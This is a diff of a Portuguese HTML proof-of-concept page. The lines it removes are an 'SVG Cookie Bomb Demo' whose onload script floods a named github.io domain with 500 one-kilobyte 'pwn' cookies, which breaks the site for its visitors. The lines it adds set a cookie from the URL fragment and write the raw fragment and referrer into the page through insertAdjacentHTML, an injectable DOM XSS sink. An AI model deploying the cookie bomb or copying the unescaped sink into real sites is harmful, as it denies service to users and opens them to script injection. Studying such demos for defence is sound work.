@@ -2,38 +2,37 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8">
-  <title>SVG Cookie Bomb Demo</title>
+  <title>PoC Cookie via Fragment</title>
 </head>
 <body>
-  <!-- SVG inline com cookie bomb -->
-  <svg xmlns="http://www.w3.org/2000/svg"
-       xmlns:xlink="http://www.w3.org/1999/xlink"
-       width="200" height="200"
-       onload="bombCookies()">
-    
-    <!-- Quadrado central -->
-    <rect x="25" y="25" width="150" height="150"
-          fill="none" stroke="black" stroke-width="2"/>
+  <h1>PoC de Cookie pelo Fragment</h1>
+  <p>
+    Ao carregar esta página com um hash (por exemplo <code>#exemplo</code>),  
+    será criado o cookie <code>ev_redir_exemplo</code> contendo o <em>referrer</em>.
+  </p>
 
-    <!-- Imagem de fundo -->
-    <image
-      x="0" y="0"
-      width="200" height="200"
-      xlink:href="https://via.placeholder.com/200"
-      preserveAspectRatio="none" />
+  <script>
+    function d(a) {
+      // pega o referrer ou "none" caso vazio
+      var b = document.referrer || "none";
+      // monta nome do cookie baseado no fragment
+      var cookieName = "ev_redir_" + encodeURIComponent(a);
+      var cookieValue = b;
+      // define o cookie para todo o path
+      document.cookie = cookieName + "=" + cookieValue + "; path=/";
+      console.log("Cookie definido:", cookieName, "=", cookieValue);
+    }
 
-    <script><![CDATA[
-      function bombCookies() {
-        const total = 500;
-        const size  = 1024; // ~1 KB por cookie
-        for (let i = 0; i < total; i++) {
-          document.cookie =
-            `pwn${i}=${'x'.repeat(size)};` +
-            ` domain=madaraninja1337.github.io;` +
-            ` path=/;`;
-        }
-      }
-    ]]></script>
-  </svg>
+    // se existir hash, chama d() passando tudo após o "#"
+    if (window.location.hash !== "") {
+      var frag = window.location.hash.substr(1).toLowerCase();
+      d(frag);
+      document.body.insertAdjacentHTML(
+        "beforeend",
+        "<p>Cookie <strong>ev_redir_" + frag + "</strong> criado com valor: <em>" +
+        (document.referrer || "none") + "</em></p>"
+      );
+    }
+  </script>
 </body>
 </html>
